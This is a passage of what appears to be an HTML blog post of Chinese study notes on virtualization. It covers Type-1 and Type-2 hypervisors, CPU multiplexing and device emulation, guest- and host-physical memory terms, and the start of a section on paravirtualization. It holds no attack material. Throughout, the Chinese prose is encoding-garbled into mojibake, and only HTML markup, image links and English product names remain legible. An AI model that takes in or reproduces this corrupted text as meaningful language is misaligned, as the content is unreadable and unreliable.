VMM</strong>ï¼šè¿™ç§ç±»å‹çš„VMMè¿è¡Œåœ¨è£¸æœºä¸Šï¼Œç›´æ¥ä¸ç¡¬ä»¶äº¤äº’ï¼Œ<strong>è´Ÿè´£æ‰§è¡Œç³»ç»Ÿçš„è°ƒåº¦å’Œèµ„æºåˆ†é…</strong>ã€‚Type-1 VMMé€šå¸¸éœ€è¦æ›´é«˜çš„ç‰¹æƒçº§åˆ«ï¼Œå¹¶å¯èƒ½åŒ…å«ä¸€äº›è™šæ‹ŸåŒ–ä¸éœ€è¦çš„é¢å¤–ä»£ç ï¼Œå› ä¸ºå®ƒè¦è´Ÿè´£ç®¡ç†æ•´ä¸ªç‰©ç†ä¸»æœºã€‚åœ¨æœåŠ¡å™¨è™šæ‹ŸåŒ–ä¸­å¸¸è§ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æä¾›æ›´å¥½çš„æ€§èƒ½å’Œéš”ç¦»ï¼Œé€‚ç”¨äºäº‘è®¡ç®—ç¯å¢ƒã€‚</li><li><strong>Type-2 VMM</strong>ï¼šè¿è¡Œåœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸‹çš„è™šæ‹Ÿæœºç›‘è§†å™¨ã€‚è™šæ‹Ÿæœºçš„èµ„æºåˆ†é…å’Œç¯å¢ƒåˆ›å»ºæ›´æ¸…æ™°åœ°ä¸ä¸»æœºæ“ä½œç³»ç»Ÿåˆ†ç¦»ã€‚<strong>ä¸»æœºæ“ä½œç³»ç»Ÿè´Ÿè´£æ­£å¸¸çš„ç³»ç»Ÿèµ„æºåˆ†é…</strong>ï¼Œè€ŒType-2 VMMæä¾›æ ‡å‡†çš„æ‰©å±•è™šæ‹Ÿæœºç¯å¢ƒã€‚é€šå¸¸ç”¨äºæ¡Œé¢è™šæ‹ŸåŒ–ï¼Œå› ä¸ºå®ƒä»¬æ›´å®¹æ˜“è®¾ç½®å’Œç®¡ç†ï¼Œä½†æ€§èƒ½é€šå¸¸è¾ƒå·®ã€‚åŒ…æ‹¬VMware Workstationã€KVMã€VirtualBoxç­‰</li></ul></li></ul><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œé‡ç‚¹åœ¨äºèµ„æºåˆ†é…ï¼Œè€Œä¸æ˜¯ç®¡ç†ç¨‹åºæ˜¯ä»¥ç‰¹æƒæ¨¡å¼è¿˜æ˜¯éç‰¹æƒæ¨¡å¼è¿è¡Œã€‚ç‰¹åˆ«æ˜¯ï¼Œå³ä½¿ç³»ç»Ÿç®¡ç†ç¨‹åºä»¥å†…æ ¸æ¨¡å¼è¿è¡Œï¼Œä¾‹å¦‚ Linux/kVM å’Œ VMware Workstation ï¼Œå®ƒä¹Ÿå¯ä»¥æ˜¯ type-2ã€‚äº‹å®ä¸Šï¼ŒGoldberg å‡è®¾ç³»ç»Ÿç®¡ç†ç¨‹åºæ€»æ˜¯ä½¿ç”¨ç®¡ç†ç¨‹åºç‰¹æƒæ‰§è¡Œã€‚è¿™ä¸¤ç§ç±»å‹åœ¨å½“å‰ç³»ç»Ÿä¸­éƒ½å¾ˆå¸¸è§ã€‚é¦–å…ˆï¼ŒVMware ESX Server [177]ã€ Xen [27,146]å’Œå¾®è½¯Hyper-Véƒ½æ˜¯ type-1 hypervisorã€‚å³ä½¿ Xen å’Œ Hyper-V ä¾èµ–äºä¸€ä¸ªåä¸º dom0çš„ä¸»æœºç¯å¢ƒï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºæœ¬èº«ä¹Ÿä¼šåšå‡ºèµ„æºåˆ†é…å’Œè°ƒåº¦å†³ç­–ã€‚VMware Workstationã€ VMware Fusionã€ KVMã€ Microsoft Virtu-alPCã€ Parallels å’Œ Oracle VirtualBox éƒ½æ˜¯ type-2 hypervisorã€‚å®ƒä»¬ä¸ä¸»æœºæ“ä½œç³»ç»Ÿåä½œï¼Œä»¥ä¾¿ä¸»æœºæ“ä½œç³»ç»Ÿè°ƒåº¦æ‰€æœ‰ç³»ç»Ÿèµ„æºã€‚ä¸»æœºæ“ä½œç³»ç»Ÿåƒè°ƒåº¦è¿›ç¨‹ä¸€æ ·è°ƒåº¦ç³»ç»Ÿç®¡ç†ç¨‹åºï¼Œå³ä½¿è¿™äº›ç³»ç»Ÿéƒ½ä¾èµ–äºå¤§é‡çš„å†…æ ¸æ¨¡å¼ç»„ä»¶æ¥æ‰§è¡Œè™šæ‹Ÿæœºã€‚ä¸€äº›ç³»ç»Ÿç®¡ç†ç¨‹åºï¼Œå¦‚ VMware Workstation å’Œ Oracle VirtualBoxï¼Œå¯ä»¥åœ¨ä¸åŒçš„ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šç§»æ¤ï¼Œè€Œ Fusion å’Œ Parallels å¯ä»¥åœ¨ Mac OS X ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒMicrosoft Virtual PC å¯ä»¥åœ¨ Windows ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼Œè€Œ KVM å¯ä»¥ä½œä¸º Linux ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†è¿è¡Œã€‚åœ¨è¿™äº› type-2ç³»ç»Ÿä¸­ï¼ŒKVM æä¾›äº†ä¸ä¸»æœºæ“ä½œç³»ç»Ÿçš„æœ€ä½³é›†æˆï¼Œå› ä¸ºç³»ç»Ÿç®¡ç†ç¨‹åºçš„å†…æ ¸æ¨¡å¼ç»„ä»¶ä½œä¸ºå†…æ ¸æ¨¡å—ç›´æ¥é›†æˆåœ¨ Linux ä¸»æœºä¸­ã€‚</p><p><strong>å…³æ³¨ç‚¹åœ¨äºèµ„æºåˆ†é…</strong>ï¼šåœ¨è™šæ‹ŸåŒ–ä¸­ï¼Œå…³é”®é—®é¢˜ä¹‹ä¸€æ˜¯å¦‚ä½•åˆ†é…å’Œç®¡ç†ç‰©ç†ä¸»æœºä¸Šçš„èµ„æºï¼ŒåŒ…æ‹¬å¤„ç†å™¨æ—¶é—´ã€å†…å­˜ã€å­˜å‚¨ç­‰ã€‚è¿™å†³å®šäº†è™šæ‹Ÿæœºçš„æ€§èƒ½å’Œéš”ç¦»ç¨‹åº¦ã€‚å› æ­¤ï¼Œè™šæ‹ŸåŒ–çš„ä¸€ä¸ªä¸»è¦ç„¦ç‚¹æ˜¯<strong>èµ„æºåˆ†é…ç­–ç•¥</strong>ï¼Œè€Œä¸ä»…ä»…æ˜¯ç®¡ç†ç¨‹åºè¿è¡Œåœ¨ç‰¹æƒæ¨¡å¼è¿˜æ˜¯éç‰¹æƒæ¨¡å¼ã€‚</p><p>ä¸€äº›è™šæ‹ŸåŒ–ç³»ç»Ÿï¼Œå¦‚VMware ESX Serverå’ŒXenï¼Œå³ä½¿ä¾èµ–äºä¸»æœºç¯å¢ƒï¼ˆå¦‚dom0ï¼‰ï¼Œä¹Ÿè¢«è®¤ä¸ºæ˜¯Type-1 Hypervisorï¼Œå› ä¸ºå®ƒä»¬è‡ªå·±è´Ÿè´£èµ„æºåˆ†é…å’Œè°ƒåº¦</p><h2 id="1-5-ä¸€ä¸ªä¸»æœºç®¡ç†ç¨‹åºçš„æ¦‚è§ˆ-å¤šè·¯å¤ç”¨ä¸ä»¿çœŸ"><a href="#1-5-ä¸€ä¸ªä¸»æœºç®¡ç†ç¨‹åºçš„æ¦‚è§ˆ-å¤šè·¯å¤ç”¨ä¸ä»¿çœŸ" class="headerlink" title="1.5 ä¸€ä¸ªä¸»æœºç®¡ç†ç¨‹åºçš„æ¦‚è§ˆ: å¤šè·¯å¤ç”¨ä¸ä»¿çœŸ"></a>1.5 ä¸€ä¸ªä¸»æœºç®¡ç†ç¨‹åºçš„æ¦‚è§ˆ: å¤šè·¯å¤ç”¨ä¸ä»¿çœŸ</h2><p>éšç€åŸºæœ¬å®šä¹‰çš„å»ºç«‹ï¼Œæˆ‘ä»¬ç°åœ¨è¿›å…¥è™šæ‹ŸåŒ–è®¡ç®—æœºç³»ç»Ÿå…³é”®å…ƒç´ çš„ç¬¬ä¸€ä¸ªSKETCHï¼Œå³è™šæ‹Ÿæœºçš„è§„èŒƒå’Œè™šæ‹Ÿæœºç›‘æ§ç¨‹åºçš„åŸºæœ¬æ„é€ å—ã€‚</p><p>å›¾1.3è¯´æ˜äº†è™šæ‹ŸåŒ–è®¡ç®—æœºç³»ç»Ÿçš„å…³é”®æ¶æ„ç»„ä»¶ã€‚å›¾ä¸­æ˜¾ç¤ºäº†ä¸‰ä¸ªè™šæ‹Ÿæœºï¼Œæ¯ä¸ªè™šæ‹Ÿæœºéƒ½æœ‰è‡ªå·±çš„<strong>è™šæ‹Ÿç¡¬ä»¶</strong>ã€è‡ªå·±çš„<strong>å®¢æˆ·æ“ä½œç³»ç»Ÿ</strong>å’Œè‡ªå·±çš„<strong>åº”ç”¨ç¨‹åº</strong>ã€‚</p><p>ç³»ç»Ÿç®¡ç†ç¨‹åº<strong>æ§åˆ¶å®é™…çš„ç‰©ç†èµ„æºå¹¶ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ã€‚åœ¨è¿™ç§ç®€åŒ–çš„ä½“ç³»ç»“æ„ä¸­ï¼Œç¡¬ä»¶(è™šæ‹Ÿæˆ–ç‰©ç†)ç”±å¤„ç†å…ƒç´ ç»„æˆï¼Œè¿™äº›å¤„ç†å…ƒç´ åŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ª <strong>CPUã€å®ƒä»¬çš„ MMU å’Œç¼“å­˜ä¸€è‡´æ€§å†…å­˜</strong>ã€‚ç”µå­å¤„ç†å…ƒä»¶è¿æ¥åˆ°ä¸€ä¸ª I/O æ€»çº¿ï¼Œå¸¦æœ‰ä¸¤ä¸ªé™„åŠ çš„ I/O è®¾å¤‡: ä¸€ä¸ªç£ç›˜å’Œä¸€ä¸ªç½‘ç»œæ¥å£å¡ï¼Œå¦‚å›¾1.3æ‰€ç¤ºã€‚æ˜¯<strong>æœåŠ¡å™¨éƒ¨ç½²çš„ä»£è¡¨</strong>ã€‚æ¡Œé¢å¹³å°å°†åŒ…æ‹¬é¢å¤–çš„è®¾å¤‡ï¼Œå¦‚é”®ç›˜ã€è§†é¢‘ã€é¼ æ ‡ã€ä¸²è¡Œç«¯å£ã€ USB ç«¯å£ç­‰ã€‚ç§»åŠ¨å¹³å°å¯èƒ½è¿˜éœ€è¦ GPSã€åŠ é€Ÿåº¦è®¡å’Œæ— çº¿ç”µã€‚åœ¨å…¶æœ€åŸºæœ¬çš„å½¢å¼ä¸­ï¼Œ<strong>è™šæ‹Ÿæœºç›‘æ§ç¨‹åºä½¿ç”¨1.1çš„ä¸‰ç§å…³é”®è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­çš„ä¸¤ç§</strong>: å®ƒ(åœ¨ç©ºé—´ä¸­ï¼Œå¯èƒ½åœ¨æ—¶é—´ä¸­)è·¨è™šæ‹Ÿæœº<strong>å¤šè·¯å¤ç”¨</strong>ç‰©ç† PEï¼Œå¹¶ä¸”å®ƒ<strong>æ¨¡æ‹Ÿ</strong>å…¶ä»–æ‰€æœ‰ä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯ I/O æ€»çº¿å’Œ I/O è®¾å¤‡ã€‚æŠ€æœ¯çš„ç»“åˆåœ¨å®è·µä¸­æ—¢æ˜¯å¿…è¦çš„ï¼Œä¹Ÿæ˜¯å……åˆ†çš„ï¼Œä»¥è¾¾åˆ°æ•ˆç‡æ ‡å‡†ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå¦‚æœæ²¡æœ‰æœ‰æ•ˆçš„æœºåˆ¶æ¥å¤ç”¨ CPU å’Œ MMUï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºå°†ä¸å¾—ä¸æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„æ‰§è¡Œã€‚äº‹å®ä¸Šï¼Œæœºå™¨æ¨¡æ‹Ÿå™¨å’Œ hypervisor ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œ<strong>å‰è€…æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„æŒ‡ä»¤é›†æ¶æ„ï¼Œè€Œåè€…å¤ç”¨è™šæ‹Ÿæœº</strong>ã€‚CPU çš„å¤šè·¯å¤ç”¨æ˜¯ä¸€ä¸ªè°ƒåº¦ä»»åŠ¡ï¼Œéå¸¸ç±»ä¼¼äºæ“ä½œç³»ç»Ÿæ‰§è¡Œçš„è°ƒåº¦è¿›ç¨‹çš„ä»»åŠ¡ã€‚è°ƒåº¦å®ä½“(è¿™é‡Œæ˜¯ hypervisor)è®¾ç½®ç¡¬ä»¶ç¯å¢ƒ(æ³¨å†Œæ–‡ä»¶ç­‰) ï¼Œç„¶åè®©è¢«è°ƒåº¦å®ä½“(è™šæ‹Ÿæœº)ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œï¼Œå‡å°‘æƒé™ã€‚</p><p><img src="https://img.gls.show/img/20230901175512.png"></p><p>è¿™ç§è°ƒåº¦æŠ€æœ¯ç§°ä¸ºç›´æ¥æ‰§è¡Œï¼Œå› ä¸ºç®¡ç†ç¨‹åºå…è®¸è™šæ‹Ÿ CPU ç›´æ¥æ‰§è¡Œå®é™…å¤„ç†å™¨ä¸Šçš„æŒ‡ä»¤ã€‚å½“ç„¶ï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºè¿˜è´Ÿè´£ç¡®ä¿è™šæ‹Ÿæœºçš„å®‰å…¨æ€§ã€‚å› æ­¤ï¼Œå®ƒç¡®ä¿è™šæ‹Ÿ CPU æ€»æ˜¯ä»¥å‡å°‘çš„æƒé™æ‰§è¡Œï¼Œä¾‹å¦‚ï¼Œè¿™æ ·å®ƒå°±ä¸èƒ½æ‰§è¡Œæœ‰ç‰¹æƒçš„ç»“æ„ä½“ã€‚å› æ­¤ï¼Œæ¯å½“æ¥å®¾æ“ä½œç³»ç»Ÿè¯•å›¾æ‰§è¡Œä¸€æ¡ç‰¹æƒæŒ‡ä»¤æ—¶ï¼Œè™šæ‹Ÿæœºçš„ç›´æ¥æ‰§è¡Œå°±ä¼šå¯¼è‡´é¢‘ç¹çš„é™·é˜±ï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºå¿…é¡»æ¨¡æ‹Ÿè¿™æ¡ç‰¹æƒæŒ‡ä»¤ã€‚å› æ­¤ï¼Œå›´ç»•ç›´æ¥æ‰§è¡Œè€Œè®¾è®¡çš„ hypervisor éµå¾ªé™·é˜±-æ¨¡æ‹Ÿç¼–ç¨‹èŒƒå‹ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ‰§è¡Œå¼€é”€æ˜¯ç”±è™šæ‹Ÿæœºçš„ hypervisor æ¨¡æ‹Ÿé™·é˜±å¼•èµ·çš„ã€‚ç‰©ç†å†…å­˜åœ¨è™šæ‹Ÿæœºä¹‹é—´ä¹Ÿæ˜¯å¤šè·¯å¤ç”¨çš„ï¼Œå› æ­¤æ¯ä¸ªè™šæ‹Ÿæœºéƒ½æœ‰ä¸€ä¸ªè¿ç»­çš„ã€å›ºå®šå¤§å°çš„ç‰©ç†å†…å­˜é‡çš„é”™è§‰ã€‚ç±»ä¼¼äºæ“ä½œç³»ç»Ÿåœ¨è¿›ç¨‹ä¹‹é—´çš„åˆ†é…ã€‚æ„å»ºè™šæ‹Ÿæœºç›‘æ§ç¨‹åºçš„ç‹¬ç‰¹æŒ‘æˆ˜åœ¨äº MMU çš„è™šæ‹ŸåŒ–ï¼Œä»¥åŠå‘è™šæ‹Ÿæœºå…¬å¼€ç”¨æˆ·çº§å’Œå†…æ ¸çº§æ‰§è¡Œç¯å¢ƒçš„èƒ½åŠ›ã€‚å¤ç”¨å’Œä»¿çœŸçš„ç»“åˆä¹Ÿæ˜¯è¶³å¤Ÿçš„ï¼Œå› ä¸ºå½“ä»Šè®¡ç®—æœºç³»ç»Ÿçš„ I/O æ“ä½œæ˜¯é€šè¿‡åˆç†çš„é«˜çº§æ“ä½œæ¥å®ç°çš„ï¼Œä¾‹å¦‚ï¼Œè®¾å¤‡é©±åŠ¨ç¨‹åºå¯ä»¥å‘å‡ºç®€å•çš„å‘½ä»¤æ¥å‘é€æè¿°ç¬¦ç¯ä¸­æŒ‡å®šçš„ç½‘ç»œæ•°æ®åŒ…åˆ—è¡¨ï¼Œæˆ–è€…å‘å‡º32KB çš„ç£ç›˜è¯·æ±‚ã€‚è™šæ‹Ÿæœºç›‘æ§ç¨‹åºæ¨¡æ‹Ÿæ¯ä¸ªç±»åˆ«è‡³å°‘ä¸€ä¸ªä»£è¡¨æ€§è®¾å¤‡çš„ç¡¬ä»¶/è½¯ä»¶æ¥å£ï¼Œå³ä¸€ä¸ªç£ç›˜è®¾å¤‡ã€ä¸€ä¸ªç½‘ç»œè®¾å¤‡ã€ä¸€ä¸ªå±å¹•è®¾å¤‡ç­‰ã€‚ä½œä¸ºæ­¤ä»¿çœŸçš„ä¸€éƒ¨åˆ†ï¼Œç³»ç»Ÿç®¡ç†ç¨‹åºä½¿ç”¨å¯ç”¨çš„ç‰©ç†è®¾å¤‡æ¥å‘å‡ºå®é™…çš„ I/Oã€‚</p><p>é•¿æœŸä»¥æ¥ï¼ŒI/O ä»¿çœŸä¸€ç›´æ˜¯ I/O è®¾å¤‡è™šæ‹ŸåŒ–çš„é¦–é€‰æ–¹æ³•ï¼Œå› ä¸ºå®ƒå…·æœ‰å¯ç§»æ¤æ€§ä¼˜åŠ¿: å³ä½¿åœ¨å…·æœ‰ä¸åŒç¡¬ä»¶è®¾å¤‡çš„å¹³å°ä¸Šè¿è¡Œæ—¶ï¼Œè™šæ‹Ÿæœºä¹Ÿèƒ½â€œçœ‹åˆ°â€ç›¸åŒçš„è™šæ‹Ÿç¡¬ä»¶ã€‚ä»Šå¤©ï¼Œç°ä»£ç¡¬ä»¶åŒ…æ‹¬å¯¹ I/O è™šæ‹ŸåŒ–çš„é«˜çº§æ¶æ„æ”¯æŒï¼Œå®ƒèƒ½å¤Ÿå®ç°æŸäº›ç±»åˆ«çš„ I/O è®¾å¤‡çš„å¤šè·¯å¤ç”¨ï¼Œåœ¨ååé‡å’Œå»¶è¿Ÿæ–¹é¢å…·æœ‰æ˜¾è‘—çš„æ€§èƒ½ä¼˜åŠ¿ï¼Œä½†ä»ç„¶ä»¥é™ä½è™šæ‹Ÿæœºçš„ç§»åŠ¨æ€§å’Œå¯ç§»æ¤æ€§ä¸ºä»£ä»·ã€‚</p><p>è¡¨1.1æä¾›äº†ä¸€ä¸ªåœ¨2000å¹´å‘å¸ƒçš„æ—©æœŸé¢å‘æ¡Œé¢çš„ hypervisor VMware Workstation 2.0ä¸­å¤šè·¯å¤ç”¨å’Œä»¿çœŸç»“åˆä½¿ç”¨çš„å…·ä½“ä¾‹å­ã€‚æ˜¾ç„¶ï¼Œç¡¬ä»¶å·²ç»è¿‡æ—¶äº†: USB æ˜¾ç„¶ä¸è§äº†ï¼Œè€Œä¸”å¤§å¤šæ•°è¯»è€…ä»æœªè§è¿‡çœŸæ­£çš„è½¯ç›˜ã€‚ç„¶è€Œï¼Œè¿™äº›æ¦‚å¿µä»ç„¶æ˜¯ç›¸åŒçš„ã€‚å¯¹äºæ¯ä¸ªç»„ä»¶ï¼Œè¡¨1.1æè¿°äº†å‰ç«¯è®¾å¤‡æŠ½è±¡(å¯è§†ä¸ºè™šæ‹Ÿæœºçš„ç¡¬ä»¶)ä»¥åŠç”¨äºå®ç°å®ƒçš„åç«¯ä»¿çœŸæœºåˆ¶ã€‚å½“èµ„æºæ˜¯å¤šè·¯å¤ç”¨çš„ï¼Œå¦‚ x86 CPU æˆ–å†…å­˜æ—¶ï¼Œå‰ç«¯å’Œåç«¯æ˜¯ç›¸åŒçš„ï¼Œå¹¶ç”±ç¡¬ä»¶å®šä¹‰ã€‚ç³»ç»Ÿç®¡ç†ç¨‹åºä»…ç”¨äºå»ºç«‹è™šæ‹Ÿèµ„æºå’Œç‰©ç†èµ„æºä¹‹é—´çš„æ˜ å°„ï¼Œç„¶åç¡¬ä»¶å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›èµ„æºï¼Œè€Œä¸éœ€è¦è¿›ä¸€æ­¥æ‹¦æˆª</p><p><img src="https://img.gls.show/img/20230903165003.png">ç„¶è€Œï¼Œå½“èµ„æºè¢«æ¨¡æ‹Ÿæ—¶ï¼Œå‰ç«¯è®¾å¤‡å¯¹åº”äºè¯¥è®¾å¤‡çš„ä¸€ä¸ªç»å…¸é€‰æ‹©çš„ä»£è¡¨ï¼Œç‹¬ç«‹äºåç«¯ã€‚ç³»ç»Ÿç®¡ç†ç¨‹åºåŒæ—¶å®ç°å‰ç«¯å’Œåç«¯ï¼Œé€šå¸¸åœ¨æ²¡æœ‰ä»»ä½•ç‰¹å®šç¡¬ä»¶æ”¯æŒçš„è½¯ä»¶ä¸­å®ç°ã€‚å‰ç«¯å®é™…ä¸Šæ˜¯æ‰€é€‰æ‹©çš„ã€æœ‰ä»£è¡¨æ€§çš„è®¾å¤‡çš„è½¯ä»¶æ¨¡å‹ã€‚åç«¯ä»¿çœŸåœ¨åº•å±‚èµ„æºä¸­é€‰æ‹©å®ç°åŠŸèƒ½ã€‚è¿™äº›åº•å±‚èµ„æºå¯èƒ½æ˜¯ç‰©ç†è®¾å¤‡æˆ–ä¸»æœºæ“ä½œç³»ç»Ÿçš„æŸäº›æ›´é«˜çº§åˆ«çš„æŠ½è±¡ã€‚ä¾‹å¦‚ï¼ŒVMware Workstation ä¸­çš„ç£ç›˜å‰ç«¯è¦ä¹ˆæ˜¯ IDEï¼Œè¦ä¹ˆæ˜¯ Buslogic SCSI è®¾å¤‡ï¼Œè¿™æ˜¯å½“æ—¶æµè¡Œçš„é€‰æ‹©ï¼Œå…¶è®¾å¤‡é©±åŠ¨ç¨‹åºæ— å¤„ä¸åœ¨ã€‚åç«¯èµ„æºå¯ä»¥æ˜¯ç‰©ç†è®¾å¤‡ï¼Œå³å®é™…çš„åŸå§‹ç£ç›˜ï¼Œä¹Ÿå¯ä»¥æ˜¯å­˜å‚¨ä¸ºç°æœ‰æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¤§æ–‡ä»¶çš„è™šæ‹Ÿç£ç›˜ã€‚å°½ç®¡ä¸å†æ˜¯åº•å±‚ç¡¬ä»¶çš„ç²¾ç¡®å‰¯æœ¬ï¼Œè™šæ‹Ÿæœºä»ç„¶æ˜¯å…¼å®¹çš„ã€‚å‡è®¾å¯ä»¥åœ¨å®¢æˆ·æ“ä½œç³»ç»Ÿä¸­åŠ è½½ä¸€ç»„ä¸åŒçš„è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œé‚£ä¹ˆè™šæ‹Ÿæœºå°†å…·æœ‰ç›¸åŒçš„åŠŸèƒ½ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™ä¸ªç³»ç»Ÿç®¡ç†ç¨‹åºç¤ºæ„å›¾å‡å®šå¤„ç†å…ƒç´ çš„å„ä¸ªç»„ä»¶å¯ä»¥è™šæ‹ŸåŒ–ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æåˆ°äº†ä¸€äº›ç¡¬ä»¶æ¶æ„æœªèƒ½ä¸ºè™šæ‹ŸåŒ–æä¾›ç¡¬ä»¶æ”¯æŒçš„å†å²äº‹å®ã€‚æ˜¯è®¨è®ºå°†æ˜¯ç¬¬äºŒç« å’Œç¬¬ä¸‰ç« çš„æ ¸å¿ƒã€‚</p><h2 id="1-6-NAMES-FOR-MEMORY"><a href="#1-6-NAMES-FOR-MEMORY" class="headerlink" title="1.6 NAMES FOR MEMORY"></a>1.6 NAMES FOR MEMORY</h2><blockquote><p>åœ¨æ—©æœŸçš„è™šæ‹ŸåŒ–è®ºæ–‡ä¸­ï¼Œæœ‰äº›æ–‡çŒ®ä½¿ç”¨äº†ä¸åŒçš„æœ¯è¯­ï¼Œç‰¹åˆ«æ˜¯â€ç‰©ç†å†…å­˜â€å’Œâ€æœºå™¨å†…å­˜â€ï¼Œæ¥åˆ†åˆ«æŒ‡ä»£å®¢æˆ·-ç‰©ç†å†…å­˜å’Œä¸»æœº-ç‰©ç†å†…å­˜ï¼Œä»¥åŒºåˆ†è™šæ‹Ÿæœºå†…å­˜å’Œå®é™…ç‰©ç†å†…å­˜ã€‚è¿™ç§æœ¯è¯­çš„ä½¿ç”¨å¯èƒ½ä¼šå¯¼è‡´æ··æ·†ï¼Œå› æ­¤ä¸ºäº†æ˜ç¡®èµ·è§ï¼Œé€šå¸¸ä½¿ç”¨â€å®¢æˆ·ç‰©ç†å†…å­˜â€å’Œâ€ä¸»æœºç‰©ç†å†…å­˜â€è¿™æ ·çš„æœ¯è¯­ã€‚</p></blockquote><ol><li><strong>ç®¡ç†ç¨‹åº</strong>ï¼šåœ¨è™šæ‹ŸåŒ–è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œç®¡ç†ç¨‹åºæ˜¯æŒ‡è™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVMMï¼‰æˆ–è¶…çº§ç®¡ç†ç¨‹åºï¼Œå®ƒè´Ÿè´£ç®¡ç†è™šæ‹Ÿæœºçš„èµ„æºï¼ŒåŒ…æ‹¬å†…å­˜ã€å¤„ç†å™¨ã€å­˜å‚¨ç­‰ã€‚</li><li><strong>è™šæ‹Ÿç‰©ç†å†…å­˜</strong>ï¼šè¿™ä¸ªæœ¯è¯­æŒ‡çš„æ˜¯è™šæ‹Ÿæœºå¯è§çš„æŠ½è±¡å†…å­˜ï¼Œå³è™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±å¯ä»¥ä½¿ç”¨çš„å†…å­˜é‡ã€‚ç„¶è€Œï¼Œä¸ºäº†é¿å…ä¸è™šæ‹Ÿå†…å­˜ï¼ˆè™šæ‹Ÿå†…å­˜æ˜¯ä¸€ç§æ“ä½œç³»ç»ŸæŠ€æœ¯ï¼Œå…è®¸å°†ç‰©ç†å†…å­˜æ‰©å±•åˆ°ç£ç›˜ä¸Šï¼‰æ··æ·†ï¼Œé€šå¸¸å°†è™šæ‹Ÿæœºå¯è§çš„æŠ½è±¡å†…å­˜ç§°ä¸ºâ€å®¢æˆ·ç‰©ç†å†…å­˜â€ã€‚</li><li><strong>å®¢æˆ·ç‰©ç†å†…å­˜</strong>ï¼šè¿™ä¸ªæœ¯è¯­ç”¨æ¥è¡¨ç¤ºè™šæ‹Ÿæœºå¯è§çš„æŠ½è±¡å†…å­˜ã€‚è™šæ‹Ÿæœºè®¤ä¸ºå®ƒå¯ä»¥è‡ªç”±ä½¿ç”¨å®¢æˆ·ç‰©ç†å†…å­˜ï¼Œè€Œä¸éœ€è¦è€ƒè™‘åº•å±‚çš„ç‰©ç†ç¡¬ä»¶ç»†èŠ‚ã€‚</li><li><strong>ä¸»æœºç‰©ç†å†…å­˜</strong>ï¼šè¿™ä¸ªæœ¯è¯­ç”¨æ¥è¡¨ç¤ºåº•å±‚å®é™…çš„ç‰©ç†å†…å­˜èµ„æºï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿæœºå®é™…è¿è¡Œåœ¨çš„ç‰©ç†ç¡¬ä»¶ä¸Šçš„å†…å­˜ã€‚ä¸»æœºç‰©ç†å†…å­˜æ˜¯ç®¡ç†ç¨‹åºï¼ˆVMMï¼‰è´Ÿè´£ç®¡ç†çš„èµ„æºã€‚</li></ol><h2 id="1-7-è™šæ‹ŸåŒ–å’ŒåŠè™šæ‹ŸåŒ–-PARAVIRTUALIZATION-çš„æ–¹æ³•"><a href="#1-7-è™šæ‹ŸåŒ–å’ŒåŠè™šæ‹ŸåŒ–-PARAVIRTUALIZATION-çš„æ–¹æ³•" class="headerlink" title="1.7 è™šæ‹ŸåŒ–å’ŒåŠè™šæ‹ŸåŒ–(PARAVIRTUALIZATION)çš„æ–¹æ³•"></a>1.7 è™šæ‹ŸåŒ–å’ŒåŠè™šæ‹ŸåŒ–(PARAVIRTUALIZATION)çš„æ–¹æ³•</h2><ol><li><strong>å…¨ï¼ˆè½¯ä»¶ï¼‰è™šæ‹ŸåŒ–ï¼ˆFull Software Virtualizationï¼‰</strong>ï¼š<ul><li>è¿™ç§æ–¹æ³•æŒ‡çš„æ˜¯é’ˆå¯¹ä¸å…·å¤‡å®Œå…¨è™šæ‹ŸåŒ–æ”¯æŒçš„ä½“ç³»ç»“æ„ï¼Œæ—¨åœ¨æœ€å¤§ç¨‹åº¦åœ°æé«˜ç¡¬ä»¶å…¼å®¹æ€§çš„è™šæ‹ŸåŒ–ç›‘è§†å™¨ï¼ˆhypervisorsï¼‰ã€‚å®ƒç‰¹åˆ«æ”¯æŒåœ¨æœªç»ä¿®æ”¹çš„æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬VMwareæ—©æœŸç‰ˆæœ¬çš„è™šæ‹ŸåŒ–ç›‘è§†å™¨ã€‚</li><li>æœ‰æ—¶åœ¨æ–‡çŒ®ä¸­ä¹Ÿç§°ä¸ºâ€è½¯ä»¶è™šæ‹ŸåŒ–â€ã€‚è¿™ç§æ–¹æ³•éœ€è¦åœ¨æ‰§è¡Œå‰ï¼ˆè‡³å°‘æœ‰æ—¶ï¼‰å°†è™šæ‹ŸæœºæŒ‡ä»¤åºåˆ—è¿›è¡Œç¿»è¯‘ã€‚è¯¦ç»†æè¿°åœ¨Â§3.2ä¸­ã€‚</li></ul></li><li><strong>ç¡¬ä»¶è™šæ‹ŸåŒ–ï¼ˆHardware 